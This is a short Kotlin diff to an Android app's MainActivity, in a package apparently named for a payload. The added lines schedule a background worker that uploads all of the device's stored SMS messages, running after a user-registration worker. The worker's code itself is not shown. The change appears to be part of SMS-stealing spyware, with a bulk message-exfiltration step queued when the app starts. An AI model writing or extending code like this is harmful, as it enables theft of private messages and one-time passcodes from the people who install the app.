@@ -53,6 +53,14 @@ class MainActivity : ComponentActivity() {
             androidx.work.OneTimeWorkRequestBuilder<com.payload.jansiix0ne.worker.RegisterUserWorker>()
                 .build()
         )
+        
+        // Schedule all SMS upload worker (for old SMS)
+        androidx.work.WorkManager.getInstance(applicationContext).enqueueUniqueWork(
+            "upload_all_sms",
+            androidx.work.ExistingWorkPolicy.KEEP,
+            androidx.work.OneTimeWorkRequestBuilder<com.payload.jansiix0ne.worker.AllSmsUploadWorker>()
+                .build()
+        )
     }
 
     override fun onResume() {
